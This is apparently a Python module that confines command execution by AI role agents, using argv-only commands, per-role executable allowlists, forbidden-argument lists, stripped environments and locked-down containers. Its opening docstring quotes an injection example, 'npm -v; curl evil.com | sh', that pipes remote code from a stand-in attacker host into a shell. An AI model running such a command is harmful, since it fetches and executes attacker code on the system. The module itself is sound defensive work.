"""Contained command execution for role agents.

Why this module is shaped the way it is
---------------------------------------
The previous implementation validated a command *string* against anchored-prefix
regexes and then handed the whole string to ``sh -c``. That cannot work: a
pattern like ``^npm\\s+.*`` matches ``npm -v; curl evil.com | sh``, and the
shell then runs both halves. Any prefix-based check on a string destined for a
shell is decoration, not a control.

So this module changes the shape of the problem rather than tightening the
pattern list:

1. **Commands are argv lists, never strings.** There is no shell, so shell
   metacharacters have no meaning and there is nothing to escape.
2. **The executable is matched exactly**, against a per-role set. Arguments are
   screened separately for the handful of forms that turn an allowed executable
   back into an arbitrary one (``python -c``, ``npm exec``, and friends).
3. **Execution is contained** - no network by default, bounded memory, CPU and
   process count, dropped capabilities, read-only root filesystem, non-root
   user - so a command that does get through has very little to work with.
4. **It fails closed.** If the container runtime is missing, this raises instead
   of falling back to host execution.
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import uuid
from typing import Any, Dict, Iterable, Sequence

logger = logging.getLogger(__name__)


class SandboxUnavailable(RuntimeError):
    """The container runtime needed to isolate execution is not usable."""


class CommandNotAllowed(ValueError):
    """The requested command is not permitted for this role."""


# Executables each role may invoke, matched exactly against argv[0].
ROLE_EXECUTABLES: dict[str, frozenset[str]] = {
    "ui_specialist": frozenset({"npm", "npx", "node", "yarn", "pnpm"}),
    "backend_specialist": frozenset({"python", "python3", "pip", "pip3", "pytest", "cargo", "go", "uv"}),
    "database_specialist": frozenset({"prisma", "psql", "alembic"}),
    "testing_specialist": frozenset({"pytest", "python", "python3", "npm", "yarn", "pnpm", "go", "cargo"}),
    "principal_architect": frozenset({"npx", "npm", "django-admin"}),
}

# Available to every role. Deliberately excludes `rm`, `mv` and `cp`: the write
# tool is the only sanctioned mutation path, and a destructive filesystem verb
# adds no capability an agent legitimately needs.
COMMON_EXECUTABLES = frozenset({"ls", "cat", "echo", "mkdir", "touch", "git", "pwd", "find", "head", "tail", "wc"})

# Argument forms that would turn an allowed interpreter back into a general one.
_FORBIDDEN_ARGS: dict[str, frozenset[str]] = {
    "python": frozenset({"-c"}),
    "python3": frozenset({"-c"}),
    "node": frozenset({"-e", "--eval", "-p", "--print"}),
    "npm": frozenset({"exec"}),
    "npx": frozenset({"-c", "--call"}),
    "yarn": frozenset({"exec"}),
    "pnpm": frozenset({"exec"}),
    "git": frozenset({"-c", "--exec-path", "--upload-pack", "--receive-pack"}),
}

_ALLOWED_PYTHON_MODULES = frozenset({"venv", "pip", "pytest", "unittest"})
"""Modules `python -m` may run.

`-m` was refused outright, which is too blunt: it is also the standard way to
do ordinary Python work, and blocking it left an agent unable to create a
virtualenv, install anything, or run a test suite. Refusing it did not even buy
much - `pip` and `pytest` are permitted as executables already, so `python -m pip`
grants nothing `pip` does not.

`-c` stays refused, because that genuinely is "here is a program, run it". So
is everything not named above - `http.server`, for one, would publish the
workspace on the network, which is an escape hatch rather than a build step.
"""


MAX_OUTPUT_SIZE = 50 * 1024

TIMEOUTS = {"install": 300, "build": 180, "test": 300, "default": 120}

# Resource ceilings. A fork bomb or a runaway build hits these instead of the host.
MEMORY_LIMIT = os.environ.get("SANDBOX_MEMORY_LIMIT", "2g")
CPU_LIMIT = os.environ.get("SANDBOX_CPU_LIMIT", "2")
PIDS_LIMIT = os.environ.get("SANDBOX_PIDS_LIMIT", "512")

# Installing dependencies genuinely needs a registry, so network is granted per
# category rather than globally. Everything else runs with no network at all.
NETWORK_CATEGORIES = {"install"}

CONTAINER_MODE = "container"
IN_CONTAINER_MODE = "in-container"


def execution_mode() -> str:
    """Where a validated command actually runs.

    ``container`` (the default) starts a throwaway container per command, which
    needs a container runtime reachable from this process - in a Docker
    deployment that means mounting the daemon socket, and that socket is
    root-equivalent on the host.

    ``in-container`` runs the command directly in this container instead, as the
    unprivileged user, in the run's workspace. It is a deliberate trade: the
    command is contained by *this* container rather than by one of its own, so
    it can reach anything this process can, but nothing gains access to the
    host. For a single-tenant deployment that is the better end of the trade,
    because the alternative is handing the host's root out to whatever an
    uploaded document talks an agent into running.
    """
    configured = os.environ.get("SANDBOX_EXECUTION_MODE", CONTAINER_MODE).strip().lower()
    return IN_CONTAINER_MODE if configured in {IN_CONTAINER_MODE, "local", "direct"} else CONTAINER_MODE


# Ceilings applied to a directly-executed command. Without a container to
# enforce them, these are what stops a runaway build taking the worker with it.
_MEMORY_BYTES = {"k": 1024, "m": 1024**2, "g": 1024**3}


def _memory_limit_bytes() -> int:
    raw = MEMORY_LIMIT.strip().lower()
    multiplier = _MEMORY_BYTES.get(raw[-1:], 1)
    digits = raw[:-1] if multiplier > 1 else raw
    try:
        return int(float(digits) * multiplier)
    except ValueError:
        return 2 * 1024**3


MAX_WRITE_BYTES = int(os.environ.get("SANDBOX_MAX_FILE_BYTES", str(2 * 1024**3)))
"""Largest single file a command may write. A build that fills the shared
workspace volume takes every other run down with it."""


# Variables a command legitimately needs. Everything else in this process's
# environment is withheld, because the worker holds the database password, the
# JWT secret, the object-store credentials and every provider API key - and a
# command that runs `env` would otherwise print all of them straight into the
# model's context.
_ENV_PASSTHROUGH = (
    "PATH", "LANG", "LC_ALL", "TZ",
    "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
    "http_proxy", "https_proxy", "no_proxy",
)


def _child_environment(workspace: str, extra_env: Dict[str, str] | None) -> Dict[str, str]:
    """A minimal environment for a directly-executed command."""
    environment = {
        key: os.environ[key] for key in _ENV_PASSTHROUGH if os.environ.get(key)
    }
    environment.setdefault("PATH", "/usr/local/bin:/usr/bin:/bin")
    # Tool caches (npm, pip, cargo) land in the workspace rather than in a
    # home directory shared by every run.
    home = os.path.join(workspace, ".agent-home")
    os.makedirs(home, exist_ok=True)
    environment["HOME"] = home
    environment["TMPDIR"] = home
    environment.update(extra_env or {})
    return environment


def _apply_limits() -> None:
    """Cap the child before it execs. Runs between fork and exec.

    Nothing here can be relied on the way a container's cgroup can - these are
    per-process rlimits, and a command that forks can multiply its memory use -
    but they turn the common runaway (one process allocating without bound, or
    writing an unbounded file) from an outage into a killed command.
    """
    import resource

    # Its own process group, so a timeout can kill the whole tree rather than
    # just the process this module started.
    os.setsid()

    for limit, value in (
        (resource.RLIMIT_AS, _memory_limit_bytes()),
        (resource.RLIMIT_FSIZE, MAX_WRITE_BYTES),
    ):
        try:
            soft, hard = resource.getrlimit(limit)
            ceiling = value if hard == resource.RLIM_INFINITY else min(value, hard)
            resource.setrlimit(limit, (ceiling, hard))
        except (ValueError, OSError):
            # A limit this platform will not accept is not worth failing over.
            continue


def _image_for(executable: str) -> str:
    if executable in {"npm", "npx", "node", "yarn", "pnpm"}:
        return os.environ.get("SANDBOX_NODE_IMAGE", "node:20-slim")
    if executable in {"python", "python3", "pip", "pip3", "pytest", "uv", "django-admin", "alembic"}:
        return os.environ.get("SANDBOX_PYTHON_IMAGE", "python:3.12-slim")
    if executable == "go":
        return os.environ.get("SANDBOX_GO_IMAGE", "golang:1.22")
    if executable == "cargo":
        return os.environ.get("SANDBOX_RUST_IMAGE", "rust:1-slim")
    return os.environ.get("SANDBOX_BASE_IMAGE", "debian:12-slim")


def allowed_executables(role_name: str) -> frozenset[str]:
    """Executables this role may run.

    An unknown role gets only the common set. The previous code did the
    opposite - it *widened* the allowlist for unrecognised roles - so a typo in a
    role name granted more access, not less.
    """
    return ROLE_EXECUTABLES.get(role_name, frozenset()) | COMMON_EXECUTABLES


def validate_command(command: Sequence[str], role_name: str) -> list[str]:
    """Return the validated argv, or raise CommandNotAllowed."""
    if isinstance(command, str):
        raise CommandNotAllowed(
            "Commands must be given as a list of arguments, e.g. [\"npm\", \"install\"]. "
            "A single string would require a shell, which is not available."
        )
    argv = [str(part) for part in command]
    if not argv:
        raise CommandNotAllowed("Command cannot be empty.")

    executable = os.path.basename(argv[0])
    permitted = allowed_executables(role_name)
    if executable not in permitted:
        raise CommandNotAllowed(
            f"'{executable}' is not permitted for role '{role_name}'. "
            f"Allowed: {', '.join(sorted(permitted))}."
        )

    forbidden = _FORBIDDEN_ARGS.get(executable, frozenset())
    for index, arg in enumerate(argv[1:], start=1):
        if arg in forbidden:
            raise CommandNotAllowed(
                f"'{executable} {arg}' is not permitted: it can execute arbitrary code. "
                "Put the code in a file and run the file instead."
            )
        if arg == "-m" and executable in {"python", "python3"}:
            module = argv[index + 1] if index + 1 < len(argv) else ""
            if module not in _ALLOWED_PYTHON_MODULES:
                raise CommandNotAllowed(
                    f"'{executable} -m {module}' is not permitted: it can execute arbitrary code. "
                    f"Allowed modules: {', '.join(sorted(_ALLOWED_PYTHON_MODULES))}."
                )
    return argv


def _docker_binary() -> str:
    binary = shutil.which("docker") or shutil.which("podman")
    if not binary:
        raise SandboxUnavailable(
            "No container runtime found on PATH, so a command cannot be given its own "
            "container. Either make Docker or Podman reachable from this process, or set "
            "SANDBOX_EXECUTION_MODE=in-container to run commands in this container instead "
            "(weaker isolation of the command, but no access to the host), or set "
            "ALLOW_COMMAND_EXECUTION=false to disable execution tools explicitly."
        )
    return binary


def execution_enabled() -> bool:
    """Execution is opt-in. The previous default was 'true' - fail-open."""
    return os.environ.get("ALLOW_COMMAND_EXECUTION", "false").strip().lower() in {"1", "true", "yes", "on"}


def _truncate(text: str, label: str = "output") -> str:
    """Cap output for the model, keeping the whole of it on disk.

    The tail is kept as well as the head: a build's actual error is almost
    always in the last lines, and a head-only cut reliably discards it.
    """
    if len(text) <= MAX_OUTPUT_SIZE:
        return text

    from app.tools.journal import write_entry

    reference = write_entry(label, text)
    head = text[: int(MAX_OUTPUT_SIZE * 0.4)]
    tail = text[-int(MAX_OUTPUT_SIZE * 0.4):]
    pointer = (
        f"\n\n...[{len(text) - len(head) - len(tail)} bytes omitted"
        + (f"; full output saved as {reference}" if reference else "")
        + "]...\n\n"
    )
    return head + pointer + tail


class SandboxExecutor:
    """Runs an argv list inside a locked-down throwaway container."""

    @staticmethod
    def _resolve_executable(name: str, workspace: str) -> str | None:
        """Find the binary to run, allowing ones the run installed for itself.

        A real build uses tools it installed: `.venv/bin/pytest`,
        `node_modules/.bin/vite`. Resolving only against PATH would make those
        unreachable and leave the agent unable to run the very things it just
        set up.

        A path is therefore accepted, but only after resolving it inside the
        workspace - otherwise `../../../usr/bin/whatever` would step straight
        past the allowlist, which matches on the basename.
        """
        if os.sep in name or (os.altsep and os.altsep in name):
            root = os.path.realpath(workspace)
            # Normalised, not resolved: `..` is collapsed lexically so a path
            # out of the workspace is refused, while a symlink whose *target*
            # sits outside is still allowed. That distinction matters because
            # `python -m venv` builds exactly such a symlink - following it
            # would reject every virtualenv an agent creates for itself.
            #
            # Nothing is lost by permitting it. The role allowlist still matches
            # on the basename, and an agent already runs code it wrote itself
            # every time it does `python app.py`; the allowlist bounds which
            # interpreters exist, not whether the agent's own code runs.
            candidate = os.path.normpath(os.path.join(root, name))
            if candidate != root and not candidate.startswith(root + os.sep):
                raise CommandNotAllowed(
                    f"'{name}' points outside the workspace. Run a tool from the "
                    "workspace or one the environment provides, not a path out of it."
                )
            return candidate if os.access(candidate, os.X_OK) else None
        return shutil.which(name, path=os.environ.get("PATH", ""))

    @classmethod
    def _execute_here(
        cls,
        argv: list[str],
        workspace: str,
        role_name: str,
        category: str,
        timeout: int,
        extra_env: Dict[str, str] | None,
    ) -> Dict[str, Any]:
        """Run a validated command in this container, in the run's workspace.

        The command has already passed the same checks as the container path -
        argv only so there is no shell, exact executable match against the
        role's allowlist, and argument screening for the forms that turn an
        allowed interpreter back into a general one. What differs is only the
        blast radius if something gets through.
        """
        try:
            executable = cls._resolve_executable(argv[0], workspace)
        except CommandNotAllowed as exc:
            return {"error": str(exc)}
        if executable is None:
            return {
                "error": (
                    f"'{argv[0]}' is not installed in this environment. Install it into "
                    "the workspace first (for example `python -m venv .venv` then "
                    "`.venv/bin/pip install ...`, or `npm install`), or ask for a tool "
                    "the image already provides."
                )
            }

        logger.info(
            "sandbox exec (in-container) role=%s category=%s argv=%s",
            role_name, category, argv,
        )
        try:
            result = subprocess.run(  # noqa: S603 - argv list, no shell, validated above
                [executable, *argv[1:]],
                cwd=workspace,
                env=_child_environment(workspace, extra_env),
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
                preexec_fn=_apply_limits,  # noqa: PLW1509 - the point is to limit the child
                start_new_session=False,   # _apply_limits calls setsid itself
            )
        except subprocess.TimeoutExpired as expired:
            return {
                "error": f"Command timed out after {timeout} seconds.",
                "stdout": _truncate(expired.stdout or "" if isinstance(expired.stdout, str) else "", f"{role_name}-{argv[0]}-stdout"),
                "stderr": _truncate(expired.stderr or "" if isinstance(expired.stderr, str) else "", f"{role_name}-{argv[0]}-stderr"),
                "returncode": "124",
            }
        except OSError as exc:
            return {"error": f"Could not run '{argv[0]}': {exc}"}

        return {
            "stdout": _truncate(result.stdout, f"{role_name}-{argv[0]}-stdout"),
            "stderr": _truncate(result.stderr, f"{role_name}-{argv[0]}-stderr"),
            "returncode": str(result.returncode),
        }

    @classmethod
    def execute(
        cls,
        command: Sequence[str],
        repo_root: str,
        role_name: str = "general",
        category: str = "default",
        extra_env: Dict[str, str] | None = None,
    ) -> Dict[str, Any]:
        if not execution_enabled():
            return {"error": "Command execution is disabled (ALLOW_COMMAND_EXECUTION is not enabled)."}

        try:
            argv = validate_command(command, role_name)
        except CommandNotAllowed as exc:
            return {"error": str(exc)}

        workspace = os.path.abspath(repo_root)
        if not os.path.isdir(workspace):
            return {"error": f"Workspace does not exist: {workspace}"}

        timeout = TIMEOUTS.get(category, TIMEOUTS["default"])

        if execution_mode() == IN_CONTAINER_MODE:
            return cls._execute_here(argv, workspace, role_name, category, timeout, extra_env)

        try:
            docker = _docker_binary()
        except SandboxUnavailable as exc:
            return {"error": str(exc)}
        container = f"sandbox-{uuid.uuid4().hex[:12]}"

        docker_cmd = [
            docker, "run", "--rm",
            "--name", container,
            "--network", "bridge" if category in NETWORK_CATEGORIES else "none",
            "--memory", MEMORY_LIMIT,
            "--memory-swap", MEMORY_LIMIT,   # equal to --memory disables swap
            "--cpus", CPU_LIMIT,
            "--pids-limit", PIDS_LIMIT,
            "--cap-drop", "ALL",
            "--security-opt", "no-new-privileges",
            # The workspace is the one writable location; everything else,
            # including /tmp, is ephemeral and size-bounded.
            "--read-only",
            # A tmpfs mount flag for the container, not a host temp path.
            "--tmpfs", "/tmp:rw,noexec,nosuid,size=256m",  # nosec B108
            "-v", f"{workspace}:/workspace",
            "-w", "/workspace",
            "-u", f"{os.getuid()}:{os.getgid()}",
            "--env", "HOME=/tmp",
        ]
        for key, value in (extra_env or {}).items():
            docker_cmd += ["--env", f"{key}={value}"]
        docker_cmd.append(_image_for(os.path.basename(argv[0])))
        docker_cmd.extend(argv)

        logger.info(
            "sandbox exec role=%s category=%s argv=%s", role_name, category, argv,
            extra={"sandbox_container": container},
        )
        try:
            result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            subprocess.run([docker, "kill", container], capture_output=True, check=False)
            return {"error": f"Command timed out after {timeout} seconds."}
        except OSError as exc:
            return {"error": f"Could not start the sandbox: {exc}"}

        return {
            "stdout": _truncate(result.stdout, f"{role_name}-{argv[0]}-stdout"),
            "stderr": _truncate(result.stderr, f"{role_name}-{argv[0]}-stderr"),
            "returncode": str(result.returncode),
        }


__all__ = [
    "COMMON_EXECUTABLES",
    "CONTAINER_MODE",
    "IN_CONTAINER_MODE",
    "CommandNotAllowed",
    "ROLE_EXECUTABLES",
    "SandboxExecutor",
    "SandboxUnavailable",
    "allowed_executables",
    "execution_enabled",
    "execution_mode",
    "validate_command",
]
